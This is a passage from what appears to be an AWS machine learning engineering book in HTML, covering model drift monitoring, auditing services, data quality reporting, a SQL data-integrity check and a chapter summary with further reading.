<li><strong class="bold">Model bias drift</strong>: This is <a id="_idIndexMarker1260"/>detected by comparing the following:<ul><li><strong class="bold">[“PROPERTIES” – A]</strong>: The bias metrics of the model on the baseline dataset</li>
<li><strong class="bold">[“PROPERTIES” – B]</strong>: The bias metrics on the captured ML inference data</li>
</ul></li>
<li><strong class="bold">Feature attribution drift</strong>: This is <a id="_idIndexMarker1261"/>detected by comparing the following: <ul><li><strong class="bold">[“PROPERTIES” – A]</strong>: The feature distribution values of the baseline dataset</li>
<li><strong class="bold">[“PROPERTIES” – B]</strong>: The feature distribution values of the captured ML inference data</li>
</ul></li>
</ul>
<p class="callout-heading">Note</p>
<p class="callout">To make it easier to grasp these concepts, let’s discuss a simple example of how <strong class="bold">SageMaker Model Monitor</strong> works. Let’s say that we have an ML model that predicts the salary of a <a id="_idIndexMarker1262"/>professional given that professional’s age. To train this model, we used a dataset with two columns: <strong class="source-inline">age</strong> and <strong class="source-inline">salary</strong>. Then, we used this training dataset for the baseline of SageMaker Model Monitor. After analyzing the dataset, SageMaker Model Monitor returned a set of suggested constraints that required that the age and salary values be always positive. The ML model was then deployed to a SageMaker inference endpoint that was configured to collect the request and response data containing the input and output values (that is, the age input and the predicted salary values). Then, we configured a SageMaker Model Monitor “schedule” that <a id="_idIndexMarker1263"/>triggers a processing job. This analyzes the collected request and response data and checks for violations against the configured constraints. If the collected data contained negative values for the age input values, SageMaker Model Monitor should be able to detect this and flag this violation after the scheduled processing job has finished running.</p>
<p>Once the detected <a id="_idIndexMarker1264"/>inconsistencies and issues have been analyzed, the data science team may perform one or more of the following fixes or corrections, depending on the issue:</p>
<ul>
<li>Fix issues in the systems that send “bad data” to the ML inference endpoint.</li>
<li>Replace the deployed model with a new one.</li>
<li>Correct existing issues in the model training and deployment pipeline.</li>
</ul>
<p>Now, let’s look at traceability, observability, and auditing.</p>
<h2 id="_idParaDest-195"><a id="_idTextAnchor208"/>Traceability, observability, and auditing</h2>
<p>We must be able to audit and check everything happening in every step of an ML experiment or <a id="_idIndexMarker1265"/>deployment, regardless of the steps being performed <a id="_idIndexMarker1266"/>manually or automatically. This allows us to easily identify <a id="_idIndexMarker1267"/>and fix issues to return the system to the desired configuration state. If an ML system is in an “unstable” state, an ML engineer must be able to use the right set of tools to troubleshoot and fix the issues quickly.</p>
<p>Let’s say that your team has started using an automated ML pipeline that accepts a dataset as input and generates a binary classification ML model as output (after going through all the steps in the pipeline). For a few weeks, the ML pipeline is working just fine... until the team decided to introduce additional data processing steps somewhere in the middle of the pipeline. The team noticed that the majority of the binary classification models generated by the pipeline <em class="italic">ALWAYS</em> returned a <strong class="source-inline">0</strong>, no matter what the input values were! Before the changes in the pipeline were implemented, all the models generated had been returning <em class="italic">0s</em> and <em class="italic">1s</em> (which is what is expected). As the ML engineer, you decided to dive a bit deeper into what happened... only to find out that the ML pipeline steps did not produce logs, which made troubleshooting harder. At the same time, you discovered that there was no tracking mechanism in place that can help the team “connect the <a id="_idIndexMarker1268"/>dots” and analyze why the generated models were <a id="_idIndexMarker1269"/>always producing a <strong class="source-inline">0</strong> for the classification result. After <a id="_idIndexMarker1270"/>realizing that it will take a few weeks to troubleshoot and fix the existing set of issues, your team decided to stop using the automated ML pipeline (which took a few months to build and polish) and throw it away. <em class="italic">Ouch!</em> If the tracking and auditing mechanisms were in place, the automated ML pipeline could have been restored to a stable state much faster.</p>
<p class="callout-heading">Note</p>
<p class="callout">Don’t let this happen to you and your team! It’s critical to use the right set of tools when building ML pipelines. For more information on ML pipelines, feel free to check out <a href="B18638_10.xhtml#_idTextAnchor215"><em class="italic">Chapter 10</em></a>, <em class="italic">Machine Learning Pipelines with Kubeflow on Amazon EKS</em>, and <a href="B18638_11.xhtml#_idTextAnchor231"><em class="italic">Chapter 11</em></a>, <em class="italic">Machine Learning Pipelines with SageMaker Pipelines</em>.</p>
<p>As an ML engineer, you need to be aware of the “tools” available for these types of requirements. We can use the following services and capabilities when performing audit work on ML environments and systems in AWS:</p>
<ul>
<li><strong class="bold">AWS CloudTrail</strong>: This can <a id="_idIndexMarker1271"/>be used to capture and log any configuration changes in the AWS account.</li>
<li><strong class="bold">AWS CloudTrail Lake</strong>: This is a <a id="_idIndexMarker1272"/>managed data lake for CloudTrail data analysis.</li>
<li><strong class="bold">Amazon CloudWatch Logs</strong>: This contains the activity logs from a variety of services <a id="_idIndexMarker1273"/>such as SageMaker, EC2, and Redshift.</li>
<li><strong class="bold">Amazon Athena CloudWatch connector</strong>: This enables CloudWatch log data to be <a id="_idIndexMarker1274"/>queried in Amazon Athena using SQL statements.</li>
<li><strong class="bold">SageMaker Model Registry</strong>: This <a id="_idIndexMarker1275"/>can be used to track model deployment approvals.</li>
<li><strong class="bold">SageMaker Experiments</strong> and <strong class="bold">SageMaker Lineage</strong>: These can be used to audit and <a id="_idIndexMarker1276"/>track model lineage after performing experiments <a id="_idIndexMarker1277"/>in SageMaker.</li>
<li><strong class="bold">AWS Audit Manager</strong>: This can <a id="_idIndexMarker1278"/>be used to simplify and speed up the auditing process of an AWS account.</li>
<li><strong class="bold">AWS X-Ray</strong>: This can be <a id="_idIndexMarker1279"/>used to trace requests across the entire application and troubleshoot performance bottlenecks in distributed applications.</li>
</ul>
<p>We won’t dive deep <a id="_idIndexMarker1280"/>into the details of how these services are used, so feel <a id="_idIndexMarker1281"/>free to check out the <em class="italic">Further reading</em> section <a id="_idIndexMarker1282"/>at the end of this chapter for more details.</p>
<h2 id="_idParaDest-196"><a id="_idTextAnchor209"/>Data quality analysis and reporting</h2>
<p>Being able to detect data quality issues as early as possible would help us manage any risks associated with <a id="_idIndexMarker1283"/>these issues. At the same time, we would be able to perform any required short-term and long-term corrections on the implementation, setup, or architecture of the ML system. In this section, we will discuss some of the possible solutions we can use to analyze the quality of the data used for training and inference.</p>
<p>The first solution involves using custom code and open source packages to prepare and generate data quality reports. In <a href="B18638_01.xhtml#_idTextAnchor017"><em class="italic">Chapter 1</em></a>, <em class="italic">Introduction to ML Engineering on AWS</em>, we used a Python library called <strong class="source-inline">pandas_profiling</strong> to automatically analyze our data and generate a profile report. Note that there are similar libraries and packages available that we can use as well. Of course, with this approach, we will have to manage the infrastructure aspect ourselves. If we want to upgrade this setup, we can choose to deploy our custom data <a id="_idIndexMarker1284"/>profiling scripts in a serverless function using <strong class="bold">AWS Lambda</strong> or in a <a id="_idIndexMarker1285"/>containerized application using <strong class="bold">Amazon ECS</strong>. </p>
<p>Another practical alternative would be to avoid building custom solutions ourselves and simply use an existing service that allows us to focus on our objectives and responsibilities. In <a href="B18638_05.xhtml#_idTextAnchor105"><em class="italic">Chapter 5</em></a>, <em class="italic">Pragmatic Data Processing and Analysis</em>, we used <strong class="bold">AWS Glue DataBrew</strong> to load, profile, and <a id="_idIndexMarker1286"/>process our data. After running a profile job, we had access to additional analysis and information, including missing <a id="_idIndexMarker1287"/>cell values, data distribution statistics, and duplicate rows. </p>
<p class="callout-heading">Note</p>
<p class="callout">Data quality issues may also arise during inference. Once we have deployed an ML model into an inference endpoint, the model can make predictions on request payloads with missing values and data quality issues. In <a href="B18638_08.xhtml#_idTextAnchor172"><em class="italic">Chapter 8</em></a>, <em class="italic">Model Monitoring and Management Solutions</em>, we enabled data capture and automated the process of detecting violations concerning the quality of data that passes through our SageMaker real-time inference endpoint. We scheduled a model monitoring processing job that would process the data and then generate an automated report containing different relevant violation statistics (approximately every hour).</p>
<h2 id="_idParaDest-197"><a id="_idTextAnchor210"/>Data integrity management</h2>
<p>Maintaining and <a id="_idIndexMarker1288"/>managing data integrity is not an easy task. Detecting and fixing data quality issues such as missing values and duplicate rows is just the first part of the challenge. Managing data integrity issues is the next challenge as we need to go one step further by ensuring that data stored in the databases is complete, accurate, and consistent.</p>
<p>In <a href="B18638_04.xhtml#_idTextAnchor079"><em class="italic">Chapter 4</em></a>, <em class="italic">Serverless Data Management on AWS</em>, we loaded a synthetic dataset into a data warehouse (using Redshift Serverless) and into a data lake (using Amazon Athena, Amazon S3, and AWS Glue). When we performed a few sample queries on the dataset, we just assumed that there were no data quality and data integrity issues to worry about. Just to refresh our memory a bit, our dataset contains around 21 columns that include a few “derived” columns. A good example of a “derived” column is the <strong class="source-inline">has_booking_changes</strong> column. The <strong class="source-inline">has_booking_changes</strong> column value is expected to be <strong class="source-inline">True</strong> if the <strong class="source-inline">booking_changes</strong> column value is greater than <strong class="source-inline">0</strong>. Otherwise, the value of <strong class="source-inline">has_booking_changes</strong> should be <strong class="source-inline">False</strong>. To identify the records where the <strong class="source-inline">booking_changes</strong> column value does not match the <strong class="source-inline">has_booking_changes</strong> column value, we performed the following query in our serverless data warehouse (Redshift Serverless): </p>
<pre class="source-code"><strong class="bold">SELECT booking_changes, has_booking_changes, * </strong>
<strong class="bold">FROM dev.public.bookings </strong>
<strong class="bold">WHERE </strong>
<strong class="bold">(booking_changes=0 AND has_booking_changes='True') </strong>
<strong class="bold">OR </strong>
<strong class="bold">(booking_changes&gt;0 AND has_booking_changes='False');</strong></pre>
<p>Here are a few ways to fix this:</p>
<ul>
<li>If only a few records are affected (relative to the total number of records), then we may (soft) delete the affected records and exclude these records from future steps in the data processing workflow. Note that this should be done with care as excluding records may significantly affect data analysis results and ML model performance (if the dataset is used to train an ML model).</li>
<li>We can perform an <strong class="source-inline">UPDATE</strong> statement that corrects the <strong class="source-inline">booking_changes</strong> column value.</li>
</ul>
<p>Note that another <a id="_idIndexMarker1289"/>possible long-term solution would be to perform the needed data integrity checks and corrections before the data is loaded into the data warehouse or data lake. This would mean that the data in the data warehouse or data lake is expected to already be “clean” upon initial data load and we can safely perform the queries and other operations in these centralized data stores.</p>
<p class="callout-heading">Note</p>
<p class="callout">In addition to these, the applications and systems interacting with the data must be reviewed. Note that even if we clean the data, there’s a chance that the connected applications would introduce a new set of data integrity issues since the root cause has not been fixed.</p>
<p><em class="italic">That’s pretty much it!</em> At this point, we should have a wider range of options for solving a variety of issues and challenges when establishing ML governance. Feel free to read this chapter again to help you get a deeper appreciation of the different concepts and techniques.</p>
<h1 id="_idParaDest-198"><a id="_idTextAnchor211"/>Summary</h1>
<p>In this chapter, we discussed a variety of strategies and solutions to manage the overall security, compliance, and governance of ML environments and systems. We started by going through several best practices to improve the security and compliance of ML environments. After that, we discussed relevant techniques on how to preserve data privacy and model privacy. Toward the end of this chapter, we covered different solutions using a variety of AWS services to establish ML governance.</p>
<p>In the next chapter, we will provide a quick introduction to <strong class="bold">MLOps pipelines</strong> and then dive deep into automating ML workflows in AWS using <strong class="bold">Kubeflow Pipelines</strong>.</p>
<h1 id="_idParaDest-199"><a id="_idTextAnchor212"/>Further reading</h1>
<p>For more information on the topics that were covered in this chapter, feel free to check out the following resources:</p>
<ul>
<li><em class="italic">AWS IAM Best Practices</em> (<a href="https://aws.amazon.com/iam/resources/best-practices/">https://aws.amazon.com/iam/resources/best-practices/</a>)</li>
<li><em class="italic">Security Best Practices for your VPC</em> (<a href="https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.xhtml">https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.xhtml</a>)</li>
<li><em class="italic">AWS PrivateLink concepts</em> (<a href="https://docs.aws.amazon.com/vpc/latest/privatelink/concepts.xhtml">https://docs.aws.amazon.com/vpc/latest/privatelink/concepts.xhtml</a>)</li>
<li><em class="italic">AWS Audit Manager concepts</em> (<a href="https://docs.aws.amazon.com/audit-manager/latest/userguide/concepts.xhtml">https://docs.aws.amazon.com/audit-manager/latest/userguide/concepts.xhtml</a>)</li>
<li><em class="italic">AWS Compliance Center</em> (<a href="https://aws.amazon.com/financial-services/security-compliance/compliance-center/">https://aws.amazon.com/financial-services/security-compliance/compliance-center/</a>)</li>
<li><em class="italic">Downloading reports in AWS Artifact</em> (<a href="https://docs.aws.amazon.com/artifact/latest/ug/downloading-documents.xhtml">https://docs.aws.amazon.com/artifact/latest/ug/downloading-documents.xhtml</a>)</li>
</ul>
</div>
</div>


<div id="sbo-rt-content"><div>
<div class="Basic-Graphics-Frame" id="_idContainer287">
</div>
</div>
<div class="Content" id="_idContainer288">
<h1 id="_idParaDest-200"><a id="_idTextAnchor213"/>Part 5:<a id="_idTextAnchor214"/>Designing and Building End-to-end MLOps Pipelines</h1>
<p>In this section, readers will learn how to design and build MLOps pipelines using a variety of services and solutions.</p>
<p>This section comprises the following chapters:</p>
<ul>
<li><a href="B18638_10.xhtml#_idTextAnchor215"><em class="italic">Chapter 10</em></a>, <em class="italic">Machine Learning Pipelines with Kubeflow on Amazon EKS</em></li>
<li><a href="B18638_11.xhtml#_idTextAnchor231"><em class="italic">Chapter 11</em></a>, <em class="italic">Machine Learning Pipelines with SageMaker Pipelines</em></li>
</ul>
</div>
<div>
<div id="_idContainer289">
</div>
</div>
</div>
</body></html>